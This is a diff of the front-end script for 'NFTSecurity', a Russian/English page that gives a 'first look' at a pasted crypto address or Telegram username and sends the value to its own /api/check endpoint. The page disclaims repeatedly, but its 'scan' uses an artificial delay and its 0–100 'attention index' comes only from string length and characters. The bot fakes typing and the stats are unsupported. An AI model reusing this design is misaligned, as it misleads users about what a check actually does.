+ru:{themeBtn:"Тёмная",themeLight:"Светлая",navMethod:"Метод",navTerms:"Условия",navRules:"Правила",navFaq:"FAQ",navScan:"Сканировать",chip:"Обзор публичного юзернейма",heroTitle:"Проверка Telegram<br><b>онлайн — первый взгляд</b>",lead:"Вставьте публичный @username для короткого обзора. Это не доказательство владения.",ctaStart:"Проверить юзернейм →",ctaHow:"Как работает",runBtn:"Проверить юзернейм — Бесплатно",chipW:"Обзор публичного адреса",heroTitleW:"Проверка адреса<br><b>онлайн — первый взгляд</b>",leadW:"Вставьте публичный адрес для короткого обзора. Это не лицензированный вывод.",ctaStartW:"Проверить адрес →",runBtnW:"Проверить адрес — Бесплатно",hintW:"Можно латиницу, цифры и символы формата адреса.",c1W:"Проверка формата и сети",c2W:"Локальный индекс внимания 0–100",c3W:"Первичные заметки о формате",c4W:"Карточка обзора в браузере",runBtnTg:"Проверить юзернейм — Бесплатно",chipTg:"Обзор публичного юзернейма",heroTitleTg:"Проверка Telegram<br><b>онлайн — первый взгляд</b>",leadTg:"Вставьте публичный @username для короткого обзора. Это не доказательство владения.",ctaStartTg:"Проверить юзернейм →",hintTg:"Можно @, латиницу, цифры и _.",c1Tg:"Проверка формата юзернейма",c2Tg:"Локальный индекс внимания 0–100",c3Tg:"Только первичные заметки",c4Tg:"Карточка обзора в браузере",scoreLabelTg:"Индекс формата",kvNetTg:"Источник",kvFmtTg:"Формат",kvTypeTg:"Тип",kvMixTg:"Заметка",kvListTg:"Списки",tabWallet:"Кошелёк",tabTg:"Telegram",addrLab:"Адрес кошелька",tgLab:"Имя в Telegram",ph:"Вставьте адрес (мин. 28 символов)...",tgPh:"@username",errTg:"Только @, латиница, цифры и _ .",ownBtn:"Подтвердить владение",ownText:"Страница не подтверждает, что юзернейм или адрес ваши. Входа в Telegram и подписи нет.",hint:"Можно @, латиницу, цифры и _.",scoreLabel:"Индекс формата",kvNet:"Сеть",kvFmt:"Формат адреса",howTitle:"Как мы работаем",howText:"Одна строка — публичный адрес. Затем сеть и короткий обзор.",st1:"лишних полей",st2:"нужен только адрес",s1t:"Вставить адрес",s1p:"Скопируйте адрес и вставьте в поле.",s2t:"Выбрать сеть",s2p:"EVM, TRON, BTC, SOL или TON.",s3t:"Читать обзор",s3p:"Сеть, формат и индекс внимания.",rulesTitle:"Правила использования",rulesLead:"Короткий набор ограничений для спокойной работы со страницей.",back:"← Назад",loading:"Сканирование",chatTitle:"Ассистент поддержки",chatStatus:"Онлайн · шаблонные ответы",chatHide:"Скрыть",chatSend:"Отправить",chatPh:"Напишите вопрос",chatDev:"Ассистент в разработке и может отвечать неточно.",chatTyping:"Печатает…",chatHello:"Здравствуйте. Я ассистент поддержки NFTSecurity. Можно нажать частый вопрос или написать свой.",chatElse:"Точного шаблона нет. Спросите про сервис, сети, индекс или условия.",c1:"Проверка формата и сети",c2:"Локальный индекс внимания 0–100",c3:"Первичные пометки про миксеры и списки",c4:"Карточка обзора в браузере",m1:"Подписей адресов в публичном поле",m2:"Подписей сетей",m3:"Обычное время обзора",m4:"Базовый взгляд остаётся бесплатным",gK:"Что вы получаете",gT:"Один первичный обзор",gP:"Короткая разбивка после вставки адреса — не лицензированный вывод.",g1t:"Индекс 0–100",g1p:"Локальное число из вставленной строки. Ниже — спокойнее, выше — смотрите дважды. Это не судебный рейтинг.",g2t:"Заметки об источниках",g2p:"Подсказки про биржу, DeFi, миксер или неизвестный тип. Это демо-заметки, не аудит потока средств.",g3t:"Напоминание про списки",g3p:"Сверьте адрес со публичными списками сами. Страница не подтверждает санкционный статус.",g4t:"Напоминание про миксеры",g4p:"Пометка, если локальная модель даёт больше внимания. Это не доказательство прохождения через миксер.",g5t:"Тип адреса",g5p:"Простой класс: похоже на контракт, кошелёк или неизвестно. Из формата, не из закрытой базы.",g6t:"История",g6p:"Карточка не качает полную историю сети. Это первый взгляд перед обозревателем блоков.",nK:"Сети",nT:"Один экран, много подписей",uK:"Для кого",uT:"Для тех, кто работает с криптой",uP:"Спокойный первый взгляд до отправки, получения или разбора публичного адреса.",u1t:"P2P-трейдеры",u1p:"Взгляните на публичный адрес до принятия перевода.",u2t:"Мерчанты",u2p:"Быстрая проверка формата до подтверждения платежа.",u3t:"OTC-дески",u3p:"Первый экран до крупной сделки. Не замена вашей проверке.",u4t:"Биржи",u4p:"Дополнительный взгляд на адрес вывода. Официальный Travel Rule остаётся за вами.",u5t:"Комплаенс",u5p:"Используйте как набросок, затем свои лицензированные инструменты.",u6t:"Исследователи",u6p:"Начните здесь, затем обозреватель и своё дело.",fK:"FAQ",fT:"FAQ",m1n:"300M+",m2n:"10+",m3n:"<5s",m4n:"100%",
+m1nTg:"@",m2nTg:"1",m3nTg:"<5s",m4nTg:"100%",
+m1Tg:"Публичные юзернеймы как текст",m2Tg:"Подпись: Telegram",m3Tg:"Обычное время обзора",m4Tg:"Базовый взгляд остаётся бесплатным",
+gKTg:"Что вы получаете",gTTg:"Первый взгляд на юзернейм",gPTg:"Короткая карточка после @username — не доказательство владения.",
+g1tTg:"Индекс 0–100",g1pTg:"Локальное число из строки. Не судебный рейтинг.",
+g2tTg:"Формат",g2pTg:"Проверка @, латиницы, цифр и подчёркивания.",
+g3tTg:"Без входа",g3pTg:"Страница не открывает Telegram и не просит код.",
+g4tTg:"Не владение",g4pTg:"Совпадение формата не доказывает, что аккаунт ваш.",
+g5tTg:"Тип",g5pTg:"Только публичная строка. Не выгрузка профиля.",
+g6tTg:"Пределы",g6pTg:"Нет истории сообщений и списка контактов. Только первый взгляд.",
+nKTg:"Охват",nTTg:"Одно поле — публичный юзернейм",
+uKTg:"Для кого",uTTg:"Для спокойного взгляда на публичный юзернейм",
+uPTg:"Первый взгляд до того, как писать или отправлять что-либо.",
+u1tTg:"P2P-чаты",u1pTg:"Взгляните на публичный @handle до продолжения диалога.",
+u2tTg:"Поддержка",u2pTg:"Проверьте формат юзернейма, который вам прислали.",
+u3tTg:"OTC-чаты",u3pTg:"Первый экран. Не замена вашей проверке.",
+u4tTg:"Команды",u4pTg:"Как набросок, затем свой процесс.",
+u5tTg:"Разбор",u5pTg:"Начните здесь, затем откройте публичный профиль сами.",
+u6tTg:"Любой",u6pTg:"Если есть только строка юзернейма — вставьте её сюда.",
+kvType:"Тип",kvMix:"Заметка про миксер",kvList:"Заметка про списки",repLow:"Локальная пометка: внимание ниже. Всё равно сверьте адрес с контрагентом.",repMid:"Локальная пометка: внимание среднее. Откройте обозреватель до перевода.",repHigh:"Локальная пометка: внимание выше. Не считайте это официальной причиной заморозки.",errEmpty:"Вставьте публичный адрес.",errEmptyTg:"Вставьте публичный @username.",errBad:"Это не похоже на адрес.",
+mwH:"Как работает взгляд на адрес",mwP:"Одно поле — публичный адрес и подпись сети. Страница читает строку в браузере. Она не качает сеть и не выдаёт официальный вывод.",mw1t:"Вставить адрес",mw1p:"Только публичный адрес. Без ключей.",mw2t:"Выбрать сеть",mw2p:"Подпись для формы, не живая нода.",mw3t:"Прочитать индекс",mw3p:"Число из проверки формата, не из базы регулятора.",
+mtH:"Как работает взгляд на юзернейм",mtP:"Одно поле — публичный @username. Страница проверяет формат в браузере. Она не открывает Telegram, не входит в аккаунт и не подтверждает владение.",mt1t:"Вставить @username",mt1p:"Латиница, цифры и подчёркивание.",mt2t:"Индекс формата",mt2p:"Длина, символы и префикс. Не выгрузка профиля.",mt3t:"Прочитать карточку",mt3p:"Только первый взгляд. Не доказательство, что аккаунт ваш.",
+fineW:"NFTSecurity предоставляется "as is". Страница даёт предварительный взгляд на публичный адрес. Это не биржа, не банк и не официальный отчёт.",
+fineT:"NFTSecurity предоставляется "as is". Вкладка Telegram даёт предварительный взгляд на публичный юзернейм. Страница не открывает Telegram, не подтверждает владение и не сохраняет вход.",
+addrLine:"NFTSecurity LLC · 1000 Wilson Blvd, Suite 2400 · Arlington, VA 22209, United States"}
+};
+const FAQ={
+en:[{q:"What is NFTSecurity?",k:"what|service|nftsecurity",a:"An independent page for a first look at a public crypto address. Not an exchange or a bank."},{q:"Is this official AML?",k:"aml|kyc|official",a:"No. The overview is informational, not a licensed AML/KYC finding."},{q:"How does a scan work?",k:"how|scan|work",a:"Paste a public address, choose a network, then build the overview in the browser."},{q:"Which networks?",k:"network|evm|tron|btc|sol|ton",a:"Labels: EVM, TRON, BTC, SOL and TON. Names are labels only."},{q:"Is it free?",k:"free|price|cost",a:"The basic overview on this page does not require a paid plan."},{q:"Where are the Terms?",k:"term|legal|rule",a:"Open Terms in the header. The full text is on that page and follows the selected language."}],
+ru:[{q:"Что такое NFTSecurity?",k:"что|сервис|nftsecurity",a:"Независимая страница для первого взгляда на публичный адрес. Не биржа и не банк."},{q:"Это официальный AML?",k:"aml|kyc|офиц",a:"Нет. Обзор информационный, не лицензированный AML/KYC вывод."},{q:"Как работает проверка?",k:"как|провер|scan",a:"Вставьте публичный адрес, выберите сеть и соберите обзор в браузере."},{q:"Какие сети?",k:"сет|evm|tron|btc|sol|ton",a:"Подписи: EVM, TRON, BTC, SOL и TON. Это только обозначения."},{q:"Это бесплатно?",k:"плат|цен|free",a:"Базовый обзор на этой странице не требует платного тарифа."},{q:"Где условия?",k:"услов|правил|term",a:"Откройте Условия в шапке. Полный текст на той странице и следует выбранному языку."}]
+};
+function langNow(){return I18N[document.documentElement.lang]||I18N.en}
+function applyLang(code){
+  const t=I18N[code]||I18N.en;
+  document.documentElement.lang=code;
+  document.getElementById("langCode").textContent=code==="en"?"EN":"RU";
+  document.querySelectorAll("[data-i18n]").forEach(function(el){if(t[el.dataset.i18n]) el.textContent=t[el.dataset.i18n]});
+  document.querySelectorAll("[data-i18n-html]").forEach(function(el){var k=el.getAttribute("data-i18n-html"); if(t[k]) el.innerHTML=t[k]});
+  document.querySelectorAll("[data-i18n-placeholder]").forEach(function(el){var k=el.getAttribute("data-i18n-placeholder"); if(t[k]) el.placeholder=t[k]});
+  document.getElementById("termsBox").innerHTML=TERMS[code]||TERMS.en;
+  localStorage.setItem("nft_lang", code);
+  fillQs();
+  fillFaq();
+  applyMode();
+}
+const box=document.getElementById("langBox"), btn=document.getElementById("langBtn");
+btn.onclick=function(e){e.stopPropagation(); box.classList.toggle("open")};
+document.addEventListener("click",function(){box.classList.remove("open")});
+document.querySelectorAll("#langMenu button").forEach(function(b){b.onclick=function(e){e.stopPropagation(); applyLang(b.dataset.lang); box.classList.remove("open")}});
+function applyTheme(mode){
+  document.body.classList.toggle("theme-light", mode==="light");
+  const t=langNow();
+  document.getElementById("themeBtn").textContent=mode==="light"?t.themeBtn:t.themeLight;
+  localStorage.setItem("nft_theme", mode);
+}
+document.getElementById("themeBtn").onclick=function(){applyTheme(document.body.classList.contains("theme-light")?"dark":"light")};
+let currentPage="home";
+function showPage(name){
+  const id=(name==="method"||name==="terms"||name==="rules")?name:"home";
+  document.querySelectorAll(".page").forEach(function(p){p.classList.toggle("on", p.id==="page-"+id)});
+  currentPage=id;
+  if(id!=="home") window.scrollTo({top:0,behavior:"smooth"});
+}
+function easeInOut(t){return t<.5?2*t*t:1-Math.pow(-2*t+2,2)/2}
+function softScroll(el, ms){
+  if(!el) return;
+  const start=window.scrollY||document.documentElement.scrollTop;
+  const header=document.querySelector(".topbar");
+  const extra=(header?header.getBoundingClientRect().height:64)+12;
+  const end=Math.max(0, el.getBoundingClientRect().top + start - extra);
+  const dist=end-start, dur=ms||780, t0=performance.now();
+  function step(now){
+    const p=Math.min(1,(now-t0)/dur);
+    window.scrollTo(0, start+dist*easeInOut(p));
+    if(p<1) requestAnimationFrame(step);
+  }
+  requestAnimationFrame(step);
+}
+window.addEventListener("hashchange", function(){
+  const h=(location.hash||"#home").slice(1);
+  if(h==="faq"){ showPage("home"); requestAnimationFrame(function(){ softScroll(document.getElementById("faq"), 860); }); return; }
+  if(h==="form"){ showPage("home"); requestAnimationFrame(function(){ softScroll(document.getElementById("form"), 640); }); return; }
+  showPage(h);
 });
-
-document.querySelectorAll(".net").forEach(c => {
-    c.addEventListener("click", () => {
-        document.querySelectorAll(".net").forEach(d => d.classList.remove("on"));
-        c.classList.add("on");
+document.querySelectorAll("[data-go]").forEach(function(a){a.addEventListener("click",function(){showPage(a.getAttribute("data-go"))})});
+let chain="USDT ERC20", mode="telegram";
+document.getElementById("scanBtn").onclick=function(e){
+  e.preventDefault();
+  showPage("home");
+  history.replaceState(null,"","#form");
+  requestAnimationFrame(function(){ softScroll(document.getElementById("form"), 640); });
+};
+document.querySelectorAll(".net").forEach(function(n){n.onclick=function(){document.querySelectorAll(".net").forEach(function(x){x.classList.remove("on")});n.classList.add("on");chain=n.dataset.chain}});
+function applyMode(){
+  const t=langNow(), tg=mode==="telegram";
+  const set=function(sel,key,html){
+    const v=t[key]; if(!v) return;
+    document.querySelectorAll(sel).forEach(function(el){
+      if(html) el.innerHTML=v; else el.textContent=v;
     });
+  };
+  set('[data-i18n="chip"]', tg?"chip":"chipW");
+  set('[data-i18n-html="heroTitle"]', tg?"heroTitle":"heroTitleW", true);
+  set('[data-i18n="lead"]', tg?"lead":"leadW");
+  set('[data-i18n="ctaStart"]', tg?"ctaStart":"ctaStartW");
+  set('[data-i18n="runBtn"]', tg?"runBtn":"runBtnW");
+  set('[data-i18n="hint"]', tg?"hintTg":"hintW");
+  set('[data-i18n="c1"]', tg?"c1Tg":"c1W");
+  set('[data-i18n="c2"]', tg?"c2Tg":"c2W");
+  set('[data-i18n="c3"]', tg?"c3Tg":"c3W");
+  set('[data-i18n="c4"]', tg?"c4Tg":"c4W");
+  set('[data-i18n="scoreLabel"]', tg?"scoreLabelTg":"scoreLabel");
+  set('[data-i18n="kvNet"]', tg?"kvNetTg":"kvNet");
+  set('[data-i18n="kvFmt"]', tg?"kvFmtTg":"kvFmt");
+  set('[data-i18n="kvType"]', tg?"kvTypeTg":"kvType");
+  set('[data-i18n="kvMix"]', tg?"kvMixTg":"kvMix");
+  set('[data-i18n="kvList"]', tg?"kvListTg":"kvList");
+  ["m1n","m2n","m3n","m4n","m1","m2","m3","m4","gK","gT","gP","g1t","g1p","g2t","g2p","g3t","g3p","g4t","g4p","g5t","g5p","g6t","g6p","nK","nT","uK","uT","uP","u1t","u1p","u2t","u2p","u3t","u3p","u4t","u4p","u5t","u5p","u6t","u6p"].forEach(function(k){
+    set('[data-i18n="'+k+'"]', tg?k+"Tg":k);
+  });
+  document.getElementById("wallet-tab").style.display=tg?"none":"";
+  document.getElementById("telegram-tab").style.display=tg?"":"none";
+  document.getElementById("netsRow").style.display=tg?"none":"";
+  var rm=document.getElementById("rowMix"), rl=document.getElementById("rowList");
+  if(rm) rm.style.display=tg?"none":"";
+  if(rl) rl.style.display=tg?"none":"";
+  var w=document.getElementById("extraWallet"), g=document.getElementById("extraTg");
+  var fw=document.getElementById("fineWallet"), ft=document.getElementById("fineTg");
+  if(w) w.style.display=tg?"none":"";
+  if(g) g.style.display=tg?"":"none";
+  if(fw) fw.style.display=tg?"none":"";
+  if(ft) ft.style.display=tg?"":"none";
+  var mw=document.getElementById("methodWallet"), mt=document.getElementById("methodTg");
+  if(mw) mw.style.display=tg?"none":"";
+  if(mt) mt.style.display=tg?"":"none";
+  fillFaq();
+}
+document.querySelectorAll(".tab").forEach(function(tab){
+  tab.onclick=function(){
+    mode=tab.dataset.tab;
+    document.querySelectorAll(".tab").forEach(function(x){x.classList.toggle("active", x===tab)});
+    applyMode();
+    document.getElementById("err").style.display="none";
+    document.getElementById("report").style.display="none";
+    document.getElementById("ownBtn").style.display="none";
+    document.getElementById("ownNote").style.display="none";
+  };
 });
+document.getElementById("ownBtn").onclick=function(){
+  const n=document.getElementById("ownNote");
+  n.textContent=langNow().ownText;
+  n.style.display="block";
+};
+const addrEl=document.getElementById("address");
+const userEl=document.getElementById("username");
+addrEl.addEventListener("input",function(){addrEl.value=addrEl.value.replace(/[^A-Za-z0-9@_.\-:]/g,"")});
+userEl.addEventListener("input",function(){userEl.value=userEl.value.replace(/[^A-Za-z0-9@_]/g,"")});
+function valid(s){s=s.trim(); if(/^0x[a-fA-F0-9]{40}$/.test(s)) return "EVM"; if(/^T[1-9A-HJ-NP-Za-km-z]{33}$/.test(s)) return "TRON"; if(/^(1|3|bc1)[a-zA-HJ-NP-Z0-9]{24,62}$/.test(s)) return "BTC"; if(/^UQ|^EQ/.test(s)) return "TON"; return s.length>=26?"unknown":null}
+function validUser(s){s=s.trim(); if(s[0]!=="@") s="@"+s; return /^@[A-Za-z][A-Za-z0-9_]{4,31}$/.test(s)?s:null}
+let scanning=false;
+document.getElementById("runBtn").onclick=function(){
+  const t=langNow(), err=document.getElementById("err"), rep=document.getElementById("report"), btn=document.getElementById("runBtn");
+  err.style.display="none"; rep.style.display="none";
+  let addr="", fmt="ok";
+  if(mode==="telegram"){
+    const u=validUser(userEl.value);
+    if(!userEl.value.trim()){err.textContent=t.errEmpty;err.style.display="block";return}
+    if(!u){err.textContent=t.errTg;err.style.display="block";return}
+    addr=u; fmt="telegram"; chain="Telegram";
+  } else {
+    addr=addrEl.value.trim();
+    if(!addr){err.textContent=t.errEmpty;err.style.display="block";return}
+    fmt=valid(addr); if(!fmt){err.textContent=t.errBad;err.style.display="block";return}
+  }
+  if(scanning) return; scanning=true; btn.disabled=true;
+  const ov=document.getElementById("transit"); ov.classList.add("on");
+  const payload={type:mode==="telegram"?"telegram":"wallet",value:addr};
+  const wait=3400+Math.floor(Math.random()*901);
+  const api=fetch("/api/check",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify(payload)}).then(function(r){return r.ok?r.json():null}).catch(function(){return null});
+  setTimeout(function(){
+    api.then(function(data){
+      let score=12, typeHint="public string", note=t.repLow;
+      if(mode==="telegram"){
+        const body=addr.replace(/^@/,"");
+        score=14;
+        if(addr.charAt(0)==="@") score+=4;
+        if(body.length>=5 && body.length<=32) score+=8; else score+=18;
+        if(/^[A-Za-z][A-Za-z0-9_]*$/.test(body)) score+=6; else score+=16;
+        if(/\d{4,}/.test(body)) score+=10;
+        if(/__/.test(body)) score+=8;
+        score=Math.min(78,score);
+        typeHint="username format";
+        note=score<28?t.repLow:score<55?t.repMid:t.repHigh;
+      } else {
+        score=18;
+        if(fmt==="unknown") score+=28;
+        if(addr.length<26) score+=16;
+        if(!/^[A-Za-z0-9]+$/.test(addr.replace(/[:._-]/g,""))) score+=12;
+        score=Math.min(82,score);
+        typeHint=fmt==="unknown"?"unknown format":"address format";
+        note=score<28?t.repLow:score<55?t.repMid:t.repHigh;
+      }
+      if(data && typeof data.score==="number") score=Math.max(0,Math.min(100,data.score));
+      document.getElementById("score").textContent=score;
+      document.getElementById("bar").style.width=score+"%";
+      document.getElementById("outChain").textContent=(data&&data.network)||(mode==="telegram"?"Telegram":chain);
+      document.getElementById("outFmt").textContent=(data&&data.format)||fmt;
+      document.getElementById("meta").textContent=addr.length>14?addr.slice(0,8)+"…"+addr.slice(-6):addr;
+      document.getElementById("outType").textContent=(data&&data.typeHint)||typeHint;
+      document.getElementById("outMix").textContent=(data&&data.mixNote)||"local format only";
+      document.getElementById("outList").textContent=(data&&data.listNote)||"not a list match";
+      document.getElementById("repNote").textContent=(data&&data.note)||note;
+      ov.classList.remove("on");
+      rep.style.display="block";
+      document.getElementById("ownBtn").style.display=mode==="telegram"?"":"none";
+      document.getElementById("ownNote").style.display="none";
+      scanning=false; btn.disabled=false;
+      rep.scrollIntoView({behavior:"smooth",block:"center"});
+    });
+  }, wait);
+};
+const PAGEFAQ={
+en:[
+{q:"What is a free wallet overview?",a:"On this page it is a first look at a public address in your browser. It is not a licensed AML product and not a bank or exchange report."},
+{q:"How do I run the check?",a:"Paste a public address, choose a network label and press the button. Do not paste keys or recovery phrases."},
+{q:"What does the result show?",a:"Format, selected network, a local attention index and short notes. It does not prove who owns the address."},
+{q:"Is USDT included?",a:"USDT ERC20 and USDT TRC20 are labels on the form. The page still only reads the string you paste."},
+{q:"How accurate is it?",a:"It is a local sketch. For a real decision use an explorer and, if needed, a licensed firm."},
+{q:"Who needs this look?",a:"Anyone who wants a calm first glance before sending or receiving. Teams should still use their own tools."},
+{q:"What is the attention index?",a:"A number 0–100 built from the pasted string. It is not a regulator score and not a freeze order."},
+{q:"Why did an exchange freeze USDT?",a:"Exchanges use their own rules. This page cannot explain or reverse a freeze."}
+],
+ru:[
+{q:"Что такое бесплатный обзор кошелька?",a:"На этой странице это первый взгляд на публичный адрес в браузере. Это не лицензированный AML-продукт и не отчёт биржи."},
+{q:"Как сделать проверку?",a:"Вставьте публичный адрес, выберите сеть и нажмите кнопку. Не вставляйте ключи и фразы восстановления."},
+{q:"Что показывает результат?",a:"Формат, выбранную сеть, локальный индекс внимания и короткие заметки. Владельца адрес не доказывает."},
+{q:"USDT входит в обзор?",a:"USDT ERC20 и USDT TRC20 есть как подписи. Страница по-прежнему читает только вставленную строку."},
+{q:"Насколько это точно?",a:"Это локальный набросок. Для решения откройте обозреватель и при необходимости лицензированную фирму."},
+{q:"Кому нужен этот взгляд?",a:"Тем, кто хочет спокойно глянуть адрес до перевода. Командам всё равно нужны свои инструменты."},
+{q:"Что такое индекс внимания?",a:"Число 0–100 из вставленной строки. Это не рейтинг регулятора и не приказ о заморозке."},
+{q:"Почему биржа заморозила USDT?",a:"Биржа действует по своим правилам. Эта страница не объясняет и не снимает заморозку."}
+]
+};
+const PAGEFAQ_TG={
+en:[
+{q:"What is a username check?",a:"A first look at a public @username in the browser. It is not a Telegram login and not proof of ownership."},
+{q:"How do I run it?",a:"Open the Telegram tab, paste @username and press the button. Do not paste codes or passwords."},
+{q:"What does the result show?",a:"Format, a local attention index and short notes. It does not prove who owns the account."},
+{q:"Does it open Telegram?",a:"No. The page stays in the browser."},
+{q:"Can it confirm ownership?",a:"No. The button only repeats that ownership is not confirmed here."}
+],
+ru:[
+{q:"Что такое проверка юзернейма?",a:"Первый взгляд на публичный @username в браузере. Это не вход в Telegram и не доказательство владения."},
+{q:"Как запустить?",a:"Откройте вкладку Telegram, вставьте @username и нажмите кнопку. Не вставляйте коды и пароли."},
+{q:"Что показывает результат?",a:"Формат, локальный индекс и короткие заметки. Владельца аккаунта это не доказывает."},
+{q:"Страница открывает Telegram?",a:"Нет. Всё остаётся в браузере."},
+{q:"Можно подтвердить владение?",a:"Нет. Кнопка только повторяет, что владение здесь не подтверждается."}
+]
+};
+function fillFaq(){
+  const box=document.getElementById("faqList"); if(!box) return;
+  const pack=(typeof mode!=="undefined" && mode==="telegram")?PAGEFAQ_TG:PAGEFAQ;
+  const list=pack[document.documentElement.lang]||pack.en;
+  box.innerHTML="";
+  list.forEach(function(item){
+    const d=document.createElement("div"); d.className="faq-item";
+    d.innerHTML="<button type='button'><span></span><span class='plus'>+</span></button><div class='ans'></div>";
+    d.querySelector("span").textContent=item.q;
+    d.querySelector(".ans").textContent=item.a;
+    d.querySelector("button").onclick=function(){ d.classList.toggle("open"); };
+    box.appendChild(d);
+  });
+}
+const chatBox=document.getElementById("chatBox"), chatLog=document.getElementById("chatLog"), chatQs=document.getElementById("chatQs");
+function addMsg(text,who){const d=document.createElement("div");d.className="msg "+who;d.textContent=text;chatLog.appendChild(d);chatLog.scrollTop=chatLog.scrollHeight}
+function matchFaq(q){const list=FAQ[document.documentElement.lang]||FAQ.en,s=(q||"").toLowerCase();let best=null,sc=0;list.forEach(function(item){let n=0;item.k.split("|").forEach(function(w){if(w&&s.indexOf(w)!==-1)n++});if(n>sc){sc=n;best=item}});return sc>0?best.a:langNow().chatElse}
+function replyTo(q){addMsg(q,"me");const wait=1800+Math.floor(Math.random()*900);const tip=document.createElement("div");tip.className="msg bot typ";tip.textContent=langNow().chatTyping;chatLog.appendChild(tip);chatLog.scrollTop=chatLog.scrollHeight;setTimeout(function(){tip.remove();addMsg(matchFaq(q),"bot")},wait)}
+function fillQs(){const list=FAQ[document.documentElement.lang]||FAQ.en;chatQs.innerHTML="";list.forEach(function(item){const b=document.createElement("button");b.type="button";b.textContent=item.q;b.onclick=function(){replyTo(item.q)};chatQs.appendChild(b)})}
+function openChat(){chatBox.classList.add("on");chatBox.classList.remove("away");if(!chatLog.dataset.ready){chatLog.dataset.ready="1";addMsg(langNow().chatHello,"bot")}fillQs()}
+document.getElementById("chatBtn").onclick=function(){if(chatBox.classList.contains("away")){chatBox.classList.remove("away")}else if(chatBox.classList.contains("on")){chatBox.classList.add("away")}else openChat()};
+document.getElementById("chatHide").onclick=function(){chatBox.classList.add("on");chatBox.classList.add("away")};
+document.getElementById("chatEdge").onclick=function(){chatBox.classList.remove("away")};
+document.getElementById("chatForm").onsubmit=function(e){e.preventDefault();const q=document.getElementById("chatInput").value.trim();if(!q)return;document.getElementById("chatInput").value="";replyTo(q)};
+applyLang(localStorage.getItem("nft_lang")==="ru"?"ru":"en");
+applyMode();
+applyTheme(localStorage.getItem("nft_theme")==="light"?"light":"dark");
 </script>
-
 </body>
 </html>
